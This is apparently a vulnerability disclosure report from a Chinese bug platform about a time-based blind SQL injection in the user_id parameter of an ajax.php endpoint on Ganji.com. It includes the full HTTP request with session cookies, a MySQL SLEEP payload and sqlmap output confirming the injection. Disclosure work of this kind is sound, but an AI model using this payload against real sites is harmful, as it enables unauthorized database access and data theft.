wybug_title: 赶集网主站SQL注射第五弹
wybug_detail:
漏洞详情 披露状态：   									2016-03-21：	细节已通知厂商并且等待厂商处理中									2016-03-21：	厂商已经确认，细节仅向厂商公开									2016-03-31：	细节向核心白帽子及相关领域专家公开									2016-04-10：	细节向普通白帽子公开									2016-04-20：	细节向实习白帽子公开									2016-05-05：	细节向公众公开  简要描述： RT 详细说明：  
GET /ajax.php?dir=self_refresh&module=get_refresh_renew_packages&user_id=653096004&category_id=4 HTTP/1.1Host: www.ganji.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ganji_uuid=8173371551499847656557; ganji_xuuid=e7510911-2105-4b0f-d1f3-7c28963bd55a.1445300100163; GANJISESSID=860957c9e22b654694c099cd3f3199a6; LastLoginTime=116-3-20; _serviceStorePostToken=927a2001253c4ffaf087af88f419fff6573fbb35; use_https=1; sscode=UROxkhApN%2FECzhj9URcO9f6Z; GanjiUserName=%23m_653096004; GanjiUserInfo=%7B%22user_id%22%3A653096004%2C%22email%22%3A%22%22%2C%22username%22%3A%22%23m_653096004%22%2C%22user_name%22%3A%22%23m_653096004%22%2C%22nickname%22%3A%22%22%7D; bizs=%5B101%5D; supercookie=AwHmZQx2ZQN0WTSzLJHkZJL2AmLmBGOyZ2HjAQywZQWxZmtjZJD2AGDmZGWxZGH0AwL%3D; last_name=%23m_653096004; STA_DS=4; self_bidding_need_phone_code_auth=1; __utmt=1; citydomain=bj; nTalk_CACHE_DATA={uid:kf_10111_ISME9754_653096004}; NTKF_T2D_CLIENTID=guest3427636C-FCD2-4651-35C6-F005781177DA; lg=1; laststore=%7B%22shop_id%22%3A%221803369%22%2C%22city%22%3A0%2C%22user_id%22%3A653096004%7D; __utma=32156897.1320679787.1458480658.1458480658.1458480658.1; __utmb=32156897.57.10.1458480658; __utmc=32156897; __utmz=32156897.1458480658.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gl_tracker=%7B%22ca_source%22%3A%22-%22%2C%22ca_name%22%3A%22-%22%2C%22ca_kw%22%3A%22-%22%2C%22ca_id%22%3A%22-%22%2C%22ca_s%22%3A%22self%22%2C%22ca_n%22%3A%22-%22%2C%22ca_i%22%3A%22-%22%2C%22sid%22%3A76845450254%7D
user_id存在延时注入   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: user_id (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: dir=self_refresh&module=get_refresh_renew_packages&user_id=653096004 AND (SELECT * FROM (SELECT(SLEEP(5)))AuLh)&category_id=4---[22:26:57] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12
